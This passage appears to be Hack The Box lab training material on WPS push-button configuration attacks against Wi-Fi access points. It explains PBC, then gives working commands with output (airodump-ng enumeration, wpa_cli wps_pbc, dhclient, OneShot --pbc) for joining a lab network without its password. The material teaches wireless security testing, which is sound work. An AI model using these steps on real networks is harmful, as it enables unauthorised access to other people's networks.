#### How Does PBC Work?

- `Physical Button Press`: Most routers and access points have a WPS button that triggers PBC.
- `Automatic Pairing`: After pressing the button, the router will listen for new device requests to connect for a set time (usually two minutes). During this period, any device that requests access can connect without needing a password.
- `Device Side Interaction`: The connecting device (e.g., smartphone, smart TV, etc.) typically has an option to connect via WPS. After selecting this, the device searches for routers or access points in PBC mode and establishes a connection. The connection is established without the need to enter a password manually.
### Enumeration

We can use `airodump-ng` to check if the Wi-Fi network is in Push Button Configuration (PBC) mode.

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 --wps
```
## Performing the attack
### Using wpa_cli

```sh
3kjS@htb[/htb]$ iwlist wlan0 scan |  grep 'Cell\|Quality\|ESSID\|IEEE'

          Cell 01 - Address: D8:D6:3D:EB:29:D5
                    Quality=61/70  Signal level=-49 dBm  
                    ESSID:"HackTheWireless"
                    IE: IEEE 802.11i/WPA2 Version 1
```

```sh
3kjS@htb[/htb]$ wpa_cli scan_results

Selected interface 'wlan0'
bssid / frequency / signal level / flags / ssid
d8:d6:3d:eb:29:d5   2412    -49 [WPA2-PSK-CCMP][WPS-PBC][ESS]   HackTheWireless
```

```sh
3kjS@htb[/htb]$ wpa_cli wps_pbc D8:D6:3D:EB:29:D5
```

After a few seconds, we can check `wpa_supplicant` to verify that we've successfully connected to the Wi-Fi network.

```sh
3kjS@htb[/htb]$ systemctl status wpa_supplicant
```

We can use `dhclient` followed by the interface name, such as `wlan0`, to obtain a valid IP address within the access point's subnet.

```sh
3kjS@htb[/htb]$ sudo dhclient wlan0
```

We can verify the connection, using `ifconfig` to confirm that we've successfully connected to the access point and received an IP address.

```sh
3kjS@htb[/htb]$ ifconfig

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 43  bytes 6665 (6.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 42  bytes 7530 (7.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
### Using Oneshot

```sh
3kjS@htb[/htb]$ airmon-ng start wlan0

Found 5 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    205 wpa_supplicant
    215 avahi-daemon
    225 NetworkManager
   1215 dhclient

PHY Interface   Driver      Chipset

phy1    wlan0       htb80211_chipset    HTB ChipSet of 802.11 radio(s) for mac80211
```

```sh
3kjS@htb[/htb]$ python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc
```
